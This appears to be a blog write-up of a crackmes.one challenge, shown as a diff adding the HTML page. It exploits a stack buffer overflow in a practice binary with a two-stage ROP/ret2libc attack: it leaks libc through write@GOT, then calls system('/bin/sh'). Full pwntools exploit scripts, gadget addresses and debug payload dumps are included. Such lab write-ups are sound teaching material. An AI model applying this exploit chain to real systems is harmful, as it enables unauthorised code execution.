@@ -1,0 +1,241 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Rop made by BitFriends</title><meta content="Rop made by BitFriends" name=title><meta content=Falcon name=author><meta content=website property=og:type><meta content=https://0xf4lc0n.github.io/blog/crackme/rop-crackme/ property=og:url><meta property=og:site_name><meta content="Rop made by BitFriends" property=og:title><meta content=https://0xf4lc0n.github.io/favicon.ico property=og:image><link href=https://0xf4lc0n.github.io/blog/crackme/rop-crackme/ rel=canonical><link rel="shortcut icon" href=https://0xf4lc0n.github.io/favicon.ico type=image/x-icon><link href=https://0xf4lc0n.github.io/atom.xml rel=alternate title=RSS type=application/atom+xml><link href=https://0xf4lc0n.github.io/css/style.css rel=stylesheet><script defer src=https://0xf4lc0n.github.io/js/script.js></script><body><div class=wrapper><header><nav class=navBar><a href=/> /home/ </a><a href=/blog> /blog/ </a><a href=/about> /about/ </a><div class=themeSwitch><button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#darkMode></use></svg></button><button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#lightMode></use></svg></button></div></nav></header><main><h1>Rop made by BitFriends</h1><p><a href=https://crackmes.one/crackme/5f3d7ed033c5d42a7c667d95 rel=noopener target=_blank>Download binary</a><p>After running the program it’s waiting for user input. When we provide any input the program displays “Hello World!”.<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># ./rop 
+</span><span>Input: test
+</span><span>Hello World!
+</span></code></pre><p>Our goal is to get a shell. Take a look at IDA.<p>This is a main function:<p><img alt src=https://0xf4lc0n.github.io/blog/crackme/rop-crackme/img/main.png><p>We have 3 function calls here. The “input” function is interesting:<p><img alt src=https://0xf4lc0n.github.io/blog/crackme/rop-crackme/img/input.png><p>The most important part is here:<pre class=language-nasm data-lang=nasm style=background:#282828;color:#fdf4c1aa><code class=language-nasm data-lang=nasm><span style=color:#fa5c4b>sub     </span><span style=color:#fdf4c1>rsp, </span><span style=color:#d3869b>40h
+</span></code></pre><p>The program allocates a local array of 64 bytes. Then according to the <a href=https://en.wikipedia.org/wiki/X86_calling_conventions rel=noopener target=_blank>x86 calling convention</a> _read’s arguments are stored in appropriate registers:<pre class=language-nasm data-lang=nasm style=background:#282828;color:#fdf4c1aa><code class=language-nasm data-lang=nasm><span style=color:#fa5c4b>lea     </span><span style=color:#fdf4c1>rax, [rbp+</span><span style=color:#8ec07c>buf</span><span style=color:#fdf4c1>]</span><span style=font-style:italic;color:#928374>  ; load addres of local array to rax
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>edx, </span><span style=color:#d3869b>280h</span><span style=font-style:italic;color:#928374>       ; load amount of characters which have to be read to edx
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>rsi, rax</span><span style=font-style:italic;color:#928374>        ; copy adres from rax to rsi
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>edi, </span><span style=color:#d3869b>0</span><span style=font-style:italic;color:#928374>          ; set file descriptor (0 means a standard input)
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>eax, </span><span style=color:#d3869b>0</span><span style=font-style:italic;color:#928374>          ; clear rax (in rax _read error code will be stored)
+</span><span style=color:#fa5c4b>call    </span><span style=color:#8ec07c>_read
+</span><span style=color:#fa5c4b>nop
+</span></code></pre><p>Before the retn instruction threre is the leave instruction. Leave destroys function stack frame, so this is the shorter version of:<pre class=language-nasm data-lang=nasm style=background:#282828;color:#fdf4c1aa><code class=language-nasm data-lang=nasm><span style=color:#fa5c4b>mov </span><span style=color:#fdf4c1>rsi, rbp
+</span><span style=color:#fa5c4b>pop </span><span style=color:#fdf4c1>rbp
+</span></code></pre><p>When retn is executed (and we didn’t make a mess), control flow backs to the main function which prints “Hello World”.<p>During _read call the stack looks like this:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>                                Lower addresses
+</span><span>
+</span><span>                         +--------------------------------+
+</span><span>                         |                                |
+</span><span>                         | return address (8 bytes)       |
+</span><span>                         |                                |
+</span><span>                         +--------------------------------+
+</span><span>                         |                                |
+</span><span>                         | saved rbp (8 bytes)            |
+</span><span>               ^         |                                |
+</span><span>               |         +--------------------------------+
+</span><span>stack overflow |         |                                |
+</span><span>direction      |         | local array (64 bytes)         |
+</span><span>               |         |                                |
+</span><span>               |         |                                |
+</span><span>               +         +--------------------------------+
+</span><span>
+</span><span>                                Higher addresses
+</span><span>
+</span></code></pre><p>In order to hit return address our payload have to overwrite 72 bytes.<p>Since the program stack is not executable (NX enabled) we need to use the ROP and ret2libc techniques to spawn a shell:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># checksec rop
+</span><span>[*] '/home/Falcon/IT/RE/Rop/rop'
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x400000)
+</span></code></pre><p>What is more this challenge requires the ASLR to be enabled so here it is:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># cat /proc/sys/kernel/randomize_va_space 
+</span><span>2
+</span><span>
+</span><span># ldd rop
+</span><span>	linux-vdso.so.1 (0x00007ffcc53be000)
+</span><span>	libc.so.6 => /lib64/libc.so.6 (0x00007f968c313000)
+</span><span>	/lib64/ld-linux-x86-64.so.2 (0x00007f968c4fe000)
+</span><span># ldd rop
+</span><span>	linux-vdso.so.1 (0x00007ffcfe735000)
+</span><span>	libc.so.6 => /lib64/libc.so.6 (0x00007fe626b3e000)
+</span><span>	/lib64/ld-linux-x86-64.so.2 (0x00007fe626d29000)
+</span></code></pre><p>To spawn a shell, I will call system(“/bin/sh”). To call system(“/bin/sh”) following steps are required:<ul><li>overwrite 72 bytes<li>overwrite return address with rop_gadget<li>place address to “/bin/sh” string on the stack<li>place system address on the stack<li>place exit address on the stack</ul><p>In order to pass “/bin/sh” string to system, the string address must be placed in rdi. The “/bin/sh” string address will be stored on stack so we have to pop it. Let’s use ROPgadget:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># ROPgadget --binary ./rop | grep "pop rdi"
+</span><span>0x0000000000400613 : pop rdi ; ret
+</span></code></pre><p>This is exactly what we need.<p>Since ALSR is on, the libc address will be different each time the program is started. This means that the address of the system function and the “/bin/sh” string will be different. So our first task is to gain current libc address.<h2 id=leaking-the-libc-address>Leaking the libc address</h2><p>The program uses write function from libc and we also use this function to leak the libc address.<p>write offset in GOT table:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># objdump -R rop
+</span><span>
+</span><span>rop:     file format elf64-x86-64
+</span><span>
+</span><span>DYNAMIC RELOCATION RECORDS
+</span><span>OFFSET           TYPE              VALUE 
+</span><span>0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
+</span><span>0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
+</span><span>0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
+</span><span>0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+</span></code></pre><p>write offset in PLT table:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># objdump -d -M intel rop | grep "write@plt"
+</span><span>0000000000400430 &LTwrite@plt>:
+</span><span>  400551:	e8 da fe ff ff       	call   400430 &LTwrite@plt>
+</span><span>  400576:	e8 b5 fe ff ff       	call   400430 &LTwrite@plt>
+</span><span>
+</span></code></pre><p>What we want to do here is to load the address of a write function from GOT table to rdi and then print that address by calling the write function.<p>This is a write function:<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fabd2f>ssize_t </span><span style=color:#8ec07c>write</span><span>(</span><span style=color:#fa5c4b>int </span><span style=color:#fdf4c1>fd</span><span>, </span><span style=color:#fa5c4b>const void </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>buf</span><span>, </span><span style=color:#fabd2f>size_t </span><span style=color:#fdf4c1>liczba</span><span>);
+</span></code></pre><p>We got three arguments:<ul><li>rdi - fd (file descriptor)<li>rsi - address of string to print<li>rdx - amount of character to write</ul><p>Let’s look for gadgets:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># ROPgadget --binary rop | grep -E 'pop rsi|pop rdx' 
+</span><span>0x0000000000400611 : pop rsi ; pop r15 ; ret
+</span></code></pre><p>In the binary there is only rsi gadget so we cant set rdx. However rdx was set to 0x280 before the first write call here:<pre class=language-nasm data-lang=nasm style=background:#282828;color:#fdf4c1aa><code class=language-nasm data-lang=nasm><span style=color:#fa5c4b>lea     </span><span style=color:#fdf4c1>rax, [rbp+</span><span style=color:#8ec07c>buf</span><span style=color:#fdf4c1>]</span><span style=font-style:italic;color:#928374>  ; load addres of local array to rax
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>edx, </span><span style=color:#d3869b>280h</span><span style=font-style:italic;color:#928374>       ; load amount of characters which have to be read to edx
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>rsi, rax</span><span style=font-style:italic;color:#928374>        ; copy adres from rax to rsi
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>edi, </span><span style=color:#d3869b>0</span><span style=font-style:italic;color:#928374>          ; set file descriptor (0 means a standard input)
+</span><span style=color:#fa5c4b>mov     </span><span style=color:#fdf4c1>eax, </span><span style=color:#d3869b>0</span><span style=font-style:italic;color:#928374>          ; clear rax (in rax _read error code will be stored)
+</span><span style=color:#fa5c4b>call    </span><span style=color:#8ec07c>_read
+</span><span style=color:#fa5c4b>nop
+</span></code></pre><p>So we only need to load proper values to rdi and rsi.<p>The first payload will contain:<ul><li>‘A’*72<li>address of rdi gadget<li>0x1 (file descriptor for write)<li>address of rsi gadget<li>write offset in GOT (this will point to the write address in libc)<li>0x0 (rsi gadget contains pop r15 instruction so we have to place some garbage on stack for r15)<li>write offset in PLT (this will point to the write call)<li>address of a main function (if we rerun the program, the libc address will be changed so we have to jump to start of the main function)</ul><p>Here is python code for part one:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/bin/python
+</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span>context.log_level </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'debug'
+</span><span>context.terminal  </span><span style=color:#fe8019>= </span><span>[</span><span style=color:#b8bb26>'tilix'</span><span>, </span><span style=color:#b8bb26>'-a'</span><span>, </span><span style=color:#b8bb26>'session-add-right'</span><span>,</span><span style=color:#b8bb26>'-e'</span><span>]
+</span><span>
+</span><span style=font-style:italic;color:#928374># Stage 1 data
+</span><span>main_address </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400537
+</span><span>write_address_got </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x601018
+</span><span>write_plt </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400430
+</span><span>
+</span><span style=font-style:italic;color:#928374># Gadgets
+</span><span>rdi_gadget </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400613
+</span><span>rsi_gadget </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400611
+</span><span>
+</span><span>proc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>'./rop'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Stage one"</span><span style=color:#fdf4c1>)
+</span><span style=font-style:italic;color:#928374># Input str
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Receive input"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.recv(</span><span style=color:#d3869b>7</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>72 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(rdi_gadget) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x1</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(rsi_gadget)</span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(write_address_got) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(write_plt) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(main_address)
+</span><span>
+</span><span style=font-style:italic;color:#928374>#gdb.attach('rop')
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Send payload"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.send(payload)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Receiving write address"</span><span style=color:#fdf4c1>)
+</span><span style=font-style:italic;color:#928374># Take only 8 bytes (this will be write address in libc)
+</span><span>leaked_address </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>proc.recv(</span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>)
+</span><span>write_libc_address </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>u64(leaked_address)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"write address in libc: </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(write_libc_address)}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>proc.close()
+</span></code></pre><h2 id=calculating-the-libc-address>Calculating the libc address</h2><p>Now when we got a write address we need a libc address. The libc address can be easily calculated:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>libc_address = obtained_write_address - write_libc_offset
+</span></code></pre><p>Finding write offset in libc:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># objdump -d -M intel /lib64/libc.so.6 | grep "<__write>:"
+</span><span>00000000000f2520 <__write>:
+</span></code></pre><h2 id=obtaining-the-rest-of-addresses>Obtaining the rest of addresses</h2><p>When we got the libc address we can calculate the rest addresses:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>system_libc = libc_address + system_libc_offset
+</span><span>bin_sh_libc = libc_address + bin_sh_libc_offset
+</span><span>exit_libc = libc_address + exit_libc_offset
+</span></code></pre><p>Required offsets:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span># objdump -d -M intel /lib64/libc.so.6 | grep "libc_system"
+</span><span>0000000000049e4a <.annobin___libc_system.start>:
+</span><span>0000000000049e50 <__libc_system>:
+</span><span>   49e57:	74 07                	je     49e60 <__libc_system+0x10>
+</span><span>0000000000049e7d <.annobin___libc_system.end>:
+</span><span>
+</span><span>#objdump -d -M intel /lib64/libc.so.6 | grep "&LTexit>:"
+</span><span>000000000003f530 &LTexit>:
+</span><span>
+</span><span># strings -tx /lib64/libc.so.6 | grep /bin/sh
+</span><span> 18f143 /bin/sh
+</span></code></pre><h1 id=spawning-a-shell>Spawning a shell</h1><p>The second payload:<ul><li>‘A’*72<li>address of rdi gadget<li>address of “/bin/sh” string<li>address of system<li>address of exit</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/bin/python
+</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span style=font-style:italic;color:#928374># Stage 1 data
+</span><span>main_address </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400537
+</span><span>write_address_got </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x601018
+</span><span>write_plt </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400430
+</span><span>
+</span><span style=font-style:italic;color:#928374># Gadgets
+</span><span>rdi_gadget </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400613
+</span><span>rsi_gadget </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x400611
+</span><span>
+</span><span style=font-style:italic;color:#928374>#libc offsets
+</span><span>write_libc_offset </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0xf2520
+</span><span>system_libc_offset </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x49e50
+</span><span>sh_libc_offset </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x18f143</span><span style=font-style:italic;color:#928374>#0x18f148
+</span><span>exit_libc_offset </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x3f530
+</span><span>
+</span><span>proc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>'./rop'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Stage one"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Receive input"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.recv(</span><span style=color:#d3869b>7</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>72 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(rdi_gadget) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x1</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(rsi_gadget)</span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(write_address_got) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x0</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(write_plt) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(main_address)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Send first payload"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.send(payload)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Receiving write address"</span><span style=color:#fdf4c1>)
+</span><span>leaked_address </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>proc.recv(</span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>)
+</span><span>write_libc_address </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>u64(leaked_address)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"write address in libc: </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(write_libc_address)}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>libc_address </span><span style=color:#fe8019>= </span><span>write_libc_address </span><span style=color:#fe8019>- </span><span>write_libc_offset
+</span><span>
+</span><span style=font-style:italic;color:#928374># Calculate required addresses
+</span><span>system_libc_address </span><span style=color:#fe8019>= </span><span>libc_address </span><span style=color:#fe8019>+ </span><span>system_libc_offset
+</span><span>sh_libc_address </span><span style=color:#fe8019>= </span><span>libc_address </span><span style=color:#fe8019>+ </span><span>sh_libc_offset
+</span><span>exit_libc_address </span><span style=color:#fe8019>= </span><span>libc_address </span><span style=color:#fe8019>+ </span><span>exit_libc_offset
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"system address in libc: </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(system_libc_address)}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"sh address in libc: </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(sh_libc_address)}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Stage two"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>shellcode </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'A'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>72 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(rdi_gadget) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(sh_libc_address) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(system_libc_address) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(exit_libc_address)
+</span><span>
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Send second payload"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.send(shellcode)
+</span><span style=color:#fdf4c1>proc.recv()
+</span><span>
+</span><span style=color:#fdf4c1>log.info(</span><span style=color:#b8bb26>"Shell spawned"</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>proc.interactive()
+</span></code></pre><pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>[+] Starting local process './rop' argv=[b'./rop'] : pid 7815
+</span><span>[*] Stage one
+</span><span>[*] Receive input
+</span><span>[DEBUG] Received 0x7 bytes:
+</span><span>    b'Input: '
+</span><span>[*] Send first payload
+</span><span>[DEBUG] Sent 0x80 bytes:
+</span><span>    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+</span><span>    *
+</span><span>    00000040  41 41 41 41  41 41 41 41  13 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+</span><span>    00000050  01 00 00 00  00 00 00 00  11 06 40 00  00 00 00 00  │····│····│··@·│····│
+</span><span>    00000060  18 10 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │··`·│····│····│····│
+</span><span>    00000070  30 04 40 00  00 00 00 00  37 05 40 00  00 00 00 00  │0·@·│····│7·@·│····│
+</span><span>    00000080
+</span><span>[*] Receiving write address
+</span><span>[DEBUG] Received 0x287 bytes:
+</span><span>    00000000  20 e5 23 3a  07 7f 00 00  80 e4 23 3a  07 7f 00 00  │ ·#:│····│··#:│····│
+</span><span>    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+</span><span>    *
+</span><span>    00000280  49 6e 70 75  74 3a 20                               │Inpu│t: │
+</span><span>    00000287
+</span><span>[*] write address in libc: 0x7f073a23e520
+</span><span>[*] system address in libc: 0x7f073a195e50
+</span><span>[*] sh address in libc: 0x7f073a2db143
+</span><span>[*] Stage two
+</span><span>[*] Send second payload
+</span><span>[DEBUG] Sent 0x68 bytes:
+</span><span>    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+</span><span>    *
+</span><span>    00000040  41 41 41 41  41 41 41 41  13 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+</span><span>    00000050  43 b1 2d 3a  07 7f 00 00  50 5e 19 3a  07 7f 00 00  │C·-:│····│P^·:│····│
+</span><span>    00000060  30 b5 18 3a  07 7f 00 00                            │0··:│····│
+</span><span>    00000068
+</span><span>[*] Shell spawned
+</span><span>[*] Switching to interactive mode
+</span><span>$ echo $0
+</span><span>[DEBUG] Sent 0x8 bytes:
+</span><span>    b'echo $0\n'
+</span><span>[DEBUG] Received 0x8 bytes:
+</span><span>    b'/bin/sh\n'
+</span><span>/bin/sh
+</span><span>$ cat Foo.txt
+</span><span>[DEBUG] Sent 0xc bytes:
+</span><span>    b'cat Foo.txt\n'
+</span><span>[DEBUG] Received 0x11 bytes:
+</span><span>    b'You can read me!\n'
+</span><span>You can read me!
+</span><span>$ sl
+</span><span>[DEBUG] Sent 0x3 bytes:
+</span><span>    b'sl\n'
+</span><span>[DEBUG] Received 0x2f bytes:
+</span><span>    b'/bin/sh: linia 3: sl: nie znaleziono polecenia\n'
+</span><span>/bin/sh: linia 3: sl: nie znaleziono polecenia
+</span><span>$  
+</span></code></pre><p>Used tools:<ul><li>Ida Freeware 7.0<li>GDB<li>pwntools<li>ROPgadget</ul><p class=tagsData></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br> Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a> colors.<br></div><div class=footRight><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=icons__background href=https://0xf4lc0n.github.io/atom.xml target=_blank><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#rss></use></svg></a></div></div></footer></div>
